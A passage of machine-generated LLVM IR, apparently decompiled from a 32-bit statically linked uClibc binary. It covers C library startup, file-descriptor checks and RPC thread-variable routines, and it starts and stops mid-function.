  %v7_8054134 = inttoptr i32 %v6_8054134 to i32*
  %v8_8054134 = load i32, i32* %v7_8054134, align 4
  call void @__pseudo_call(i32 %v8_8054134)
  %v0_805413b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805413b = add i32 %v0_805413b.pre, -1
  store i32 %v1_805413b, i32* %ebx.global-to-local, align 4
  %v10_805413c = icmp eq i32 %v0_805413b.pre, 0
  %v1_805413f = icmp eq i1 %v10_805413c, false
  br i1 %v1_805413f, label %dec_label_pc_8054134, label %dec_label_pc_8054141

dec_label_pc_8054141:                             ; preds = %dec_label_pc_8054134, %entry
  %v0_8054141 = load i32, i32* @global_var_8067658.270, align 8
  %v1_8054146 = icmp eq i32 %v0_8054141, 0
  br i1 %v1_8054146, label %dec_label_pc_805414c, label %dec_label_pc_805414a

dec_label_pc_805414a:                             ; preds = %dec_label_pc_8054141
  %v0_805414a = load i32, i32* %stack_var_-16, align 4
  %v1_805414a = call i32 @unknown_0(i32 %v0_805414a)
  br label %dec_label_pc_805414c

dec_label_pc_805414c:                             ; preds = %dec_label_pc_805414a, %dec_label_pc_8054141
  %v0_805414c = load i32, i32* @global_var_806765c.271, align 4
  %v1_8054152 = icmp eq i32 %v0_805414c, 0
  br i1 %v1_8054152, label %dec_label_pc_805415b, label %dec_label_pc_8054156

dec_label_pc_8054156:                             ; preds = %dec_label_pc_805414c
  %v2_8054156 = load i32, i32* %stack_var_-16, align 4
  %v1_8054159 = call i32 @unknown_0(i32 %v2_8054156)
  br label %dec_label_pc_805415b

dec_label_pc_805415b:                             ; preds = %dec_label_pc_8054156, %dec_label_pc_805414c
  %v2_805415b = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_805415b

; uselistorder directives
  uselistorder i32 %v1_805413b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054134, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_8054162 = load i32, i32* @eax, align 4
  ret i32 %v0_8054162
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8054163 = load i32, i32* @esi, align 4
  %v0_8054164 = load i32, i32* @eax, align 4
  store i32 %v0_8054164, i32* @esi, align 4
  %v0_8054166 = load i32, i32* @ebx, align 4
  store i32 %v0_8054166, i32* %stack_var_-8, align 4
  %v0_8054167 = load i32, i32* @edx, align 4
  store i32 %v0_8054167, i32* @ebx, align 4
  %v4_805416f = call i32 @__libc_fcntl(i32 %v0_8054164, i32 1, i32 %tmp6)
  %v1_8054177 = add i32 %v4_805416f, 1
  %v8_8054177 = icmp eq i32 %v1_8054177, 0
  %v1_8054178 = icmp eq i1 %v8_8054177, false
  br i1 %v1_8054178, label %dec_label_pc_8054193, label %dec_label_pc_805417a

dec_label_pc_805417a:                             ; preds = %entry
  %v0_805417c = load i32, i32* @ebx, align 4
  %v4_8054182 = trunc i32 %v0_805417c to i8
  %v5_8054182 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_805c760.272 to i32), i8 %v4_8054182, i32 %v1_8054177)
  %v1_805418a = load i32, i32* @esi, align 4
  %v12_805418a = icmp eq i32 %v5_8054182, %v1_805418a
  br i1 %v12_805418a, label %dec_label_pc_8054193, label %dec_label_pc_805418e

dec_label_pc_805418e:                             ; preds = %dec_label_pc_805417a
  %v0_805418e = call i32 @abort()
  br label %dec_label_pc_8054193

dec_label_pc_8054193:                             ; preds = %dec_label_pc_805417a, %entry, %dec_label_pc_805418e
  %v2_8054193 = load i32, i32* %stack_var_-12, align 4
  %v2_8054194 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054194, i32* @ebx, align 4
  store i32 %v0_8054163, i32* @esi, align 4
  ret i32 %v2_8054193

; uselistorder directives
  uselistorder i32 (i32, i8, i32)* @__libc_open, { 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8054193, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_805419a = load i8, i8* @global_var_8067660.273, align 32
  %v1_805419a = icmp eq i8 %v0_805419a, 0
  %v1_80541a1 = icmp eq i1 %v1_805419a, false
  br i1 %v1_80541a1, label %entry.dec_label_pc_80541d3_crit_edge, label %dec_label_pc_80541a3

entry.dec_label_pc_80541d3_crit_edge:             ; preds = %entry
  %v0_80541d6.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80541d3

dec_label_pc_80541a3:                             ; preds = %entry
  store i8 1, i8* @global_var_8067660.273, align 32
  store i32 4096, i32* @global_var_8067654.156, align 4
  %v0_80541bd = call i32 @__pthread_initialize_minimal()
  %v0_80541ce = call i32 @_stdio_init()
  br label %dec_label_pc_80541d3

dec_label_pc_80541d3:                             ; preds = %entry.dec_label_pc_80541d3_crit_edge, %dec_label_pc_80541a3
  %v0_80541d6 = phi i32 [ %v0_80541d6.pre, %entry.dec_label_pc_80541d3_crit_edge ], [ %v0_80541ce, %dec_label_pc_80541a3 ]
  ret i32 %v0_80541d6

; uselistorder directives
  uselistorder i8* @global_var_8067660.273, { 1, 0 }
  uselistorder label %dec_label_pc_80541d3, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg4, i32* @ebp, align 4
  store i32 %arg7, i32* @global_var_806764c.274, align 4
  store i32 %arg6, i32* @global_var_806765c.271, align 4
  %v2_805420e = mul i32 %arg2, 4
  %v3_805420e = add i32 %tmp29, %v2_805420e
  store i32 %v3_805420e, i32* %eax.global-to-local, align 4
  %v1_8054211 = add i32 %v3_805420e, 4
  store i32 %v1_8054211, i32* %edx.global-to-local, align 4
  store i32 %v1_8054211, i32* @global_var_8067650.265, align 16
  %v3_805421a = load i32, i32* %arg3, align 4
  %v14_805421a = icmp eq i32 %v1_8054211, %v3_805421a
  store i32 0, i32* %stack_var_-168, align 4
  %v1_8054220 = icmp eq i1 %v14_805421a, false
  %v4_8054220 = select i1 %v1_8054220, i32 %v1_8054211, i32 %v3_805420e
  store i32 %v4_8054220, i32* @global_var_8067650.265, align 16
  %v2_8054228 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8054228, i32* %eax.global-to-local, align 4
  %v3_805422d = bitcast i32* %stack_var_-136 to i8*
  %v4_805422d = call i32 @__GI_memset(i8* %v3_805422d, i32 0, i32 120)
  %v0_8054232 = load i32, i32* @global_var_8067650.265, align 16
  store i32 %v0_8054232, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805423a

dec_label_pc_805423a:                             ; preds = %dec_label_pc_805423a, %entry
  %v0_805423a = phi i32 [ %v1_805423d, %dec_label_pc_805423a ], [ %v0_8054232, %entry ]
  %v1_805423a = inttoptr i32 %v0_805423a to i32*
  %v2_805423a = load i32, i32* %v1_805423a, align 4
  %v3_805423a = icmp eq i32 %v2_805423a, 0
  %v1_805423d = add i32 %v0_805423a, 4
  store i32 %v1_805423d, i32* %eax.global-to-local, align 4
  %v1_8054240 = icmp eq i1 %v3_805423a, false
  br i1 %v1_8054240, label %dec_label_pc_805423a, label %dec_label_pc_8054261.preheader

dec_label_pc_8054261.preheader:                   ; preds = %dec_label_pc_805423a
  store i32 %v1_805423d, i32* @ebx, align 4
  %v1_80542611 = inttoptr i32 %v1_805423d to i32*
  %v2_80542612 = load i32, i32* %v1_80542611, align 4
  %v3_80542613 = icmp eq i32 %v2_80542612, 0
  %v1_805426410 = icmp eq i1 %v3_80542613, false
  br i1 %v1_805426410, label %dec_label_pc_8054246.lr.ph, label %dec_label_pc_8054266

dec_label_pc_8054246.lr.ph:                       ; preds = %dec_label_pc_8054261.preheader
  %v3_805421e = ptrtoint i32* %stack_var_-168 to i32
  %v3_8054251 = add i32 %v3_805421e, 32
  br label %dec_label_pc_8054246

dec_label_pc_8054246:                             ; preds = %dec_label_pc_8054246.lr.ph, %dec_label_pc_805425e
  %v1_8054251 = phi i32 [ %v2_80542612, %dec_label_pc_8054246.lr.ph ], [ %v2_8054261, %dec_label_pc_805425e ]
  %v0_8054250 = phi i32 [ %v1_805423d, %dec_label_pc_8054246.lr.ph ], [ %v1_805425e, %dec_label_pc_805425e ]
  store i32 %v1_8054251, i32* %eax.global-to-local, align 4
  %v6_805424b = icmp ugt i32 %v1_8054251, 14
  br i1 %v6_805424b, label %dec_label_pc_805425e, label %dec_label_pc_805424d

dec_label_pc_805424d:                             ; preds = %dec_label_pc_8054246
  %v0_805424d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805424d, i32* %stack_var_-160, align 4
  store i32 %v0_8054250, i32* %stack_var_-168, align 4
  %v2_8054251 = mul i32 %v1_8054251, 8
  %v4_8054251 = add i32 %v3_8054251, %v2_8054251
  store i32 %v4_8054251, i32* %eax.global-to-local, align 4
  %v3_8054256 = inttoptr i32 %v4_8054251 to i16*
  %v4_8054256 = call i32 @memcpy(i16* %v3_8054256, i32 %v0_8054250, i32 8)
  store i32 %v4_8054256, i32* %eax.global-to-local, align 4
  %v0_805425e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805425e

dec_label_pc_805425e:                             ; preds = %dec_label_pc_8054246, %dec_label_pc_805424d
  %v0_805425e = phi i32 [ %v0_8054250, %dec_label_pc_8054246 ], [ %v0_805425e.pre, %dec_label_pc_805424d ]
  %v1_805425e = add i32 %v0_805425e, 8
  store i32 %v1_805425e, i32* @ebx, align 4
  %v1_8054261 = inttoptr i32 %v1_805425e to i32*
  %v2_8054261 = load i32, i32* %v1_8054261, align 4
  %v3_8054261 = icmp eq i32 %v2_8054261, 0
  %v1_8054264 = icmp eq i1 %v3_8054261, false
  br i1 %v1_8054264, label %dec_label_pc_8054246, label %dec_label_pc_8054266

dec_label_pc_8054266:                             ; preds = %dec_label_pc_805425e, %dec_label_pc_8054261.preheader
  store i32 %v2_8054228, i32* @eax, align 4
  %v0_805426a = call i32 @_dl_aux_init()
  store i32 %v0_805426a, i32* @eax, align 4
  %v0_805426f = call i32 @__GI___uClibc_init()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_805427d = icmp eq i32 %tmp24, 0
  %v3_805427f = select i1 %v1_805427d, i32 4096, i32 %tmp24
  store i32 %v3_805427f, i32* %eax.global-to-local, align 4
  %v13_8054282 = icmp eq i32 %tmp23, -1
  store i32 %v3_805427f, i32* @global_var_8067654.156, align 4
  %v1_805428c = icmp eq i1 %v13_8054282, false
  br i1 %v1_805428c, label %dec_label_pc_80542b7, label %dec_label_pc_805428e

dec_label_pc_805428e:                             ; preds = %dec_label_pc_8054266
  %v0_805428e = call i32 @getuid()
  store i32 %v0_805428e, i32* %eax.global-to-local, align 4
  store i32 %v0_805428e, i32* @ebx, align 4
  %v0_8054295 = call i32 @geteuid()
  store i32 %v0_8054295, i32* %eax.global-to-local, align 4
  %v0_805429a = load i32, i32* @ebx, align 4
  %v12_805429a = icmp eq i32 %v0_805429a, %v0_8054295
  %v1_805429c = icmp eq i1 %v12_805429a, false
  br i1 %v1_805429c, label %dec_label_pc_80542cd, label %dec_label_pc_805429e

dec_label_pc_805429e:                             ; preds = %dec_label_pc_805428e
  %v0_805429e = call i32 @getgid()
  store i32 %v0_805429e, i32* %eax.global-to-local, align 4
  store i32 %v0_805429e, i32* @ebx, align 4
  %v0_80542a5 = call i32 @getegid()
  store i32 %v0_80542a5, i32* %eax.global-to-local, align 4
  %v0_80542aa = load i32, i32* @ebx, align 4
  %v12_80542aa = icmp eq i32 %v0_80542aa, %v0_80542a5
  %v1_80542ac = icmp eq i1 %v12_80542aa, false
  br i1 %v1_80542ac, label %dec_label_pc_80542cd, label %dec_label_pc_80542ae.thread

dec_label_pc_80542ae.thread:                      ; preds = %dec_label_pc_805429e
  br label %dec_label_pc_80542f7

dec_label_pc_80542b7:                             ; preds = %dec_label_pc_8054266
  store i32 %tmp23, i32* %eax.global-to-local, align 4
  %v15_80542b7 = icmp eq i32 %tmp23, %tmp22
  %v1_80542bb = icmp eq i1 %v15_80542b7, false
  br i1 %v1_80542bb, label %dec_label_pc_80542cd, label %dec_label_pc_80542bd

dec_label_pc_80542bd:                             ; preds = %dec_label_pc_80542b7
  br label %dec_label_pc_80542cd

dec_label_pc_80542cd:                             ; preds = %dec_label_pc_80542bd, %dec_label_pc_805428e, %dec_label_pc_80542b7, %dec_label_pc_805429e
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_80542d4 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_80542e3 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_80542f2 = call i32 @__check_one_fd()
  br label %dec_label_pc_80542f7

dec_label_pc_80542f7:                             ; preds = %dec_label_pc_80542ae.thread, %dec_label_pc_80542cd
  %storemerge = phi i32 [ %tmp23, %dec_label_pc_80542ae.thread ], [ %v0_80542f2, %dec_label_pc_80542cd ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v0_80542f7 = load i32, i32* @edi, align 4
  %v1_80542f7 = inttoptr i32 %v0_80542f7 to i32*
  %v2_80542f7 = load i32, i32* %v1_80542f7, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e568.268 to i32), i32 -134604136), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_80542f7, i32* inttoptr (i32 134622648 to i32*), align 8
  store i32 %arg5, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8067658.270, align 8
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e568.268 to i32), i32 -134604136), i32 2), i32 0), label %dec_label_pc_805431c, label %dec_label_pc_8054328

dec_label_pc_805431c:                             ; preds = %dec_label_pc_80542f7, %dec_label_pc_805431c
  %v4_805431c52 = phi i32 [ %v1_8054323, %dec_label_pc_805431c ], [ 0, %dec_label_pc_80542f7 ]
  store i32 ptrtoint (i32* @global_var_8054323.276 to i32), i32* %stack_var_-160, align 4
  %v5_805431c = mul i32 %v4_805431c52, 4
  %v6_805431c = add i32 %v5_805431c, ptrtoint (i32* @global_var_805e568.268 to i32)
  %v7_805431c = inttoptr i32 %v6_805431c to i32*
  %v8_805431c = load i32, i32* %v7_805431c, align 4
  call void @__pseudo_call(i32 %v8_805431c)
  %v0_8054323 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054323 = add i32 %v0_8054323, 1
  store i32 %v1_8054323, i32* %ebx.global-to-local, align 4
  %v1_8054324 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054324 = icmp ult i32 %v1_8054323, %v1_8054324
  br i1 %v7_8054324, label %dec_label_pc_805431c, label %dec_label_pc_8054328

dec_label_pc_8054328:                             ; preds = %dec_label_pc_805431c, %dec_label_pc_80542f7
  store i32 134562606, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e568.268 to i32), i32 -134604136), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e568.268 to i32), i32 -134604136), i32 2), i32 0), label %dec_label_pc_8054340, label %dec_label_pc_805434c

dec_label_pc_8054340:                             ; preds = %dec_label_pc_8054328, %dec_label_pc_8054340
  %v4_805434042 = phi i32 [ %v1_8054347, %dec_label_pc_8054340 ], [ 0, %dec_label_pc_8054328 ]
  store i32 ptrtoint (i32* @global_var_8054347.277 to i32), i32* %stack_var_-160, align 4
  %v5_8054340 = mul i32 %v4_805434042, 4
  %v6_8054340 = add i32 %v5_8054340, ptrtoint (i32* @global_var_805e568.268 to i32)
  %v7_8054340 = inttoptr i32 %v6_8054340 to i32*
  %v8_8054340 = load i32, i32* %v7_8054340, align 4
  call void @__pseudo_call(i32 %v8_8054340)
  %v0_8054347 = load i32, i32* @ebx, align 4
  %v1_8054347 = add i32 %v0_8054347, 1
  store i32 %v1_8054347, i32* @ebx, align 4
  %v1_8054348.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8054348 = icmp ult i32 %v1_8054347, %v1_8054348.pre
  br i1 %v7_8054348, label %dec_label_pc_8054340, label %dec_label_pc_805434c

dec_label_pc_805434c:                             ; preds = %dec_label_pc_8054340, %dec_label_pc_8054328
  store i32 134526530, i32* %eax.global-to-local, align 4
  %v0_8054355 = load i32, i32* %stack_var_-160, align 4
  %v1_8054355 = call i32 @__errno_location(i32 %v0_8054355)
  %v1_805435a = inttoptr i32 %v1_8054355 to i32*
  store i32 0, i32* %v1_805435a, align 4
  store i32 134526515, i32* %eax.global-to-local, align 4
  %v0_8054369 = call i32 @__h_errno_location()
  store i32 %v0_8054369, i32* %eax.global-to-local, align 4
  %v1_805436e = inttoptr i32 %v0_8054369 to i32*
  store i32 0, i32* %v1_805436e, align 4
  %v0_8054374 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8054374, i32* %stack_var_-160, align 4
  %v0_805437b = load i32, i32* @edi, align 4
  store i32 %v0_805437b, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_805438a = load i32, i32* %eax.global-to-local, align 4
  %v1_805438d = call i32 @__GI_exit(i32 %v0_805438a)
  store i32 %v1_805438d, i32* %eax.global-to-local, align 4
  ret i32 %v1_805438d

; uselistorder directives
  uselistorder i32 %v1_8054347, { 1, 2, 0 }
  uselistorder i32 %v1_8054323, { 1, 2, 0 }
  uselistorder i32 %v2_8054261, { 1, 0 }
  uselistorder i32 %v1_805425e, { 2, 1, 0 }
  uselistorder i32 %v1_8054251, { 0, 2, 1 }
  uselistorder i32 %v1_805423d, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_805423a, { 1, 0 }
  uselistorder i32 %v1_8054211, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 %tmp23, { 2, 0, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 3, 4, 5, 2, 6, 7, 0, 12, 13, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e568.268 to i32), i32 -134604136), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805e568.268 to i32), { 1, 2, 3, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e568.268 to i32), i32 -134604136), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8054340, { 1, 0 }
  uselistorder label %dec_label_pc_805431c, { 1, 0 }
  uselistorder label %dec_label_pc_80542f7, { 1, 0 }
  uselistorder label %dec_label_pc_80542cd, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805425e, { 1, 0 }
  uselistorder label %dec_label_pc_8054246, { 1, 0 }
}

define i32 @rpc_thread_multi() local_unnamed_addr {
dec_label_pc_80543bd:
  %v4_80543a9 = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_8067680.278 to i32), i32 134542775, i32 134542775)
  ret i32 %v4_80543a9
}

define i32 @__rpc_thread_variables(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80543c1 = load i32, i32* @ebx, align 4
  %v1_80543d3 = call i32 @__pthread_internal_tsd_get(i32 2)
  %v1_80543e2 = icmp eq i32 %v1_80543d3, 0
  store i32 %v1_80543d3, i32* @ebx, align 4
  %v1_80543e6 = icmp eq i1 %v1_80543e2, false
  br i1 %v1_80543e6, label %dec_label_pc_805449c, label %dec_label_pc_80543ec

dec_label_pc_80543ec:                             ; preds = %entry
  %v5_8054401 = call i32 @pthread_once(i32* nonnull @global_var_8067664.280, i32 134562708, i32 134542184, i32 134542184)
  %v1_8054431 = call i32 @__pthread_internal_tsd_get(i32 2)
  %v1_8054440 = icmp eq i32 %v1_8054431, 0
  store i32 %v1_8054431, i32* @ebx, align 4
  %v1_8054444 = icmp eq i1 %v1_8054440, false
  br i1 %v1_8054444, label %dec_label_pc_805449c, label %dec_label_pc_8054446

dec_label_pc_8054446:                             ; preds = %dec_label_pc_80543ec
  %v5_805444f = call i32 @calloc(i64 1, i32 200, i32 %v1_8054431, i32 %v1_8054431)
  %v1_8054457 = icmp eq i32 %v5_805444f, 0
  store i32 %v5_805444f, i32* %ebx.global-to-local, align 4
  br i1 %v1_8054457, label %dec_label_pc_805447d, label %dec_label_pc_805445d

dec_label_pc_805445d:                             ; preds = %dec_label_pc_8054446
  %v4_805446b = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v5_805444f, i32 134542775, i32 134542775)
  %v0_805449d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805449c

dec_label_pc_805447d:                             ; preds = %dec_label_pc_8054446
  %v1_805448b = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_805448b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805449c

dec_label_pc_805449c:                             ; preds = %entry, %dec_label_pc_80543ec, %dec_label_pc_805445d, %dec_label_pc_805447d
  %v0_805449d = phi i32 [ %v1_80543d3, %entry ], [ %v1_8054431, %dec_label_pc_80543ec ], [ %v0_805449d.pre, %dec_label_pc_805445d ], [ %v1_805448b, %dec_label_pc_805447d ]
  %v2_805449c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805449c, i32* @edx, align 4
  store i32 %v0_80543c1, i32* @ebx, align 4
  ret i32 %v0_805449d

; uselistorder directives
  uselistorder label %dec_label_pc_805449c, { 3, 2, 1, 0 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  %v1_80544a5 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_80544af = icmp eq i32 %v1_80544a5, 134641280
  br i1 %v6_80544af, label %dec_label_pc_80544bc, label %dec_label_pc_80544b6

dec_label_pc_80544b6:                             ; preds = %entry
  %v1_80544b6 = add i32 %v1_80544a5, 148
  br label %dec_label_pc_80544bc

dec_label_pc_80544bc:                             ; preds = %entry, %dec_label_pc_80544b6
  %v0_80544bc = phi i32 [ ptrtoint (i32* @global_var_8067e2c.281 to i32), %entry ], [ %v1_80544b6, %dec_label_pc_80544b6 ]
  ret i32 %v0_80544bc

; uselistorder directives
  uselistorder i32 %v1_80544a5, { 1, 0 }
  uselistorder label %dec_label_pc_80544bc, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  %v1_80544c5 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_80544cf = icmp eq i32 %v1_80544c5, 134641280
  br i1 %v6_80544cf, label %dec_label_pc_80544dc, label %dec_label_pc_80544d6

dec_label_pc_80544d6:                             ; preds = %entry
  %v1_80544d6 = add i32 %v1_80544c5, 144
  br label %dec_label_pc_80544dc

dec_label_pc_80544dc:                             ; preds = %entry, %dec_label_pc_80544d6
  %v0_80544dc = phi i32 [ ptrtoint (i32* @global_var_8067e40.282 to i32), %entry ], [ %v1_80544d6, %dec_label_pc_80544d6 ]
  ret i32 %v0_80544dc

; uselistorder directives
  uselistorder i32 %v1_80544c5, { 1, 0 }
  uselistorder label %dec_label_pc_80544dc, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  %v1_80544e5 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_80544ef = icmp eq i32 %v1_80544e5, 134641280
  br i1 %v6_80544ef, label %dec_label_pc_80544fc, label %dec_label_pc_80544f6

dec_label_pc_80544f6:                             ; preds = %entry
  %v1_80544f6 = add i32 %v1_80544e5, 128
  br label %dec_label_pc_80544fc

dec_label_pc_80544fc:                             ; preds = %entry, %dec_label_pc_80544f6
  %storemerge = phi i32 [ %v1_80544f6, %dec_label_pc_80544f6 ], [ ptrtoint (i32* @global_var_8067e30.283 to i32), %entry ]
  %v0_80544fc = phi i32 [ %v1_80544f6, %dec_label_pc_80544f6 ], [ ptrtoint (i32* @global_var_8067e30.283 to i32), %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_80544fc

; uselistorder directives
  uselistorder i32 %v1_80544e5, { 1, 0 }
  uselistorder label %dec_label_pc_80544fc, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset() local_unnamed_addr {
entry:
  %v1_8054505 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8054511 = icmp eq i32 %v1_8054505, 134641280
  %v1_8054517 = icmp eq i1 %v6_8054511, false
  %v4_8054517 = select i1 %v1_8054517, i32 %v1_8054505, i32 ptrtoint (i32* @global_var_8067da0.284 to i32)
  ret i32 %v4_8054517

; uselistorder directives
  uselistorder i32 %v1_8054505, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v1_8054530 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8054530, i32* @ebx, align 4
  %v1_8054542 = icmp eq i32 %v1_8054530, 0
  br i1 %v1_8054542, label %dec_label_pc_80545d8, label %dec_label_pc_805454a

dec_label_pc_805454a:                             ; preds = %entry
  %v6_805454a = icmp eq i32 %v1_8054530, 134641280
  br i1 %v6_805454a, label %dec_label_pc_80545d8, label %dec_label_pc_8054556

dec_label_pc_8054556:                             ; preds = %dec_label_pc_805454a
  %v0_8054556 = call i32 @__rpc_thread_svc_cleanup()
  %v0_805455b = call i32 @__rpc_thread_clnt_cleanup()
  %v0_8054563 = load i32, i32* @ebx, align 4
  %v1_8054563 = add i32 %v0_8054563, 152
  %v2_8054563 = inttoptr i32 %v1_8054563 to i32*
  %v3_8054563 = load i32, i32* %v2_8054563, align 4
  %v1_8054569 = call i32 @free(i32 %v3_8054563)
  %v0_805456f = load i32, i32* @ebx, align 4
  %v1_805456f = add i32 %v0_805456f, 156
  %v2_805456f = inttoptr i32 %v1_805456f to i32*
  %v3_805456f = load i32, i32* %v2_805456f, align 4
  %v1_8054575 = call i32 @free(i32 %v3_805456f)
  %v0_805457b = load i32, i32* @ebx, align 4
  %v1_805457b = add i32 %v0_805457b, 160
  %v2_805457b = inttoptr i32 %v1_805457b to i32*
  %v3_805457b = load i32, i32* %v2_805457b, align 4
  %v1_8054581 = call i32 @free(i32 %v3_805457b)
  %v0_8054587 = load i32, i32* @ebx, align 4
  %v1_8054587 = add i32 %v0_8054587, 188
  %v2_8054587 = inttoptr i32 %v1_8054587 to i32*
  %v3_8054587 = load i32, i32* %v2_8054587, align 4
  %v1_805458d = call i32 @free(i32 %v3_8054587)
  %v0_8054593 = load i32, i32* @ebx, align 4
  %v1_8054593 = add i32 %v0_8054593, 172
  %v2_8054593 = inttoptr i32 %v1_8054593 to i32*
  %v3_8054593 = load i32, i32* %v2_8054593, align 4
  %v1_8054599 = call i32 @free(i32 %v3_8054593)
  %v0_805459f = load i32, i32* @ebx, align 4
  %v1_805459f = add i32 %v0_805459f, 176
  %v2_805459f = inttoptr i32 %v1_805459f to i32*
  %v3_805459f = load i32, i32* %v2_805459f, align 4
  %v1_80545a5 = call i32 @free(i32 %v3_805459f)
  %v0_80545aa = load i32, i32* @ebx, align 4
  %v1_80545ad = call i32 @free(i32 %v0_80545aa)
  %v0_80545be = load i32, i32* @ecx, align 4
  %v4_80545c4 = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 %v0_80545be, i32 %v0_80545be)
  br label %dec_label_pc_80545d8

dec_label_pc_80545d8:                             ; preds = %dec_label_pc_805454a, %entry, %dec_label_pc_8054556
  %v2_80545d8 = load i32, i32* %stack_var_-12, align 4
  ret i32 %v2_80545d8

; uselistorder directives
  uselistorder i32 %v1_8054530, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i32 188, { 1, 0 }
  uselistorder i32 134641280, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32)* @__pthread_internal_tsd_get, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_80545d8, { 2, 0, 1 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v1_80545e3 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v0_80545e8 = load i32, i32* @edx, align 4
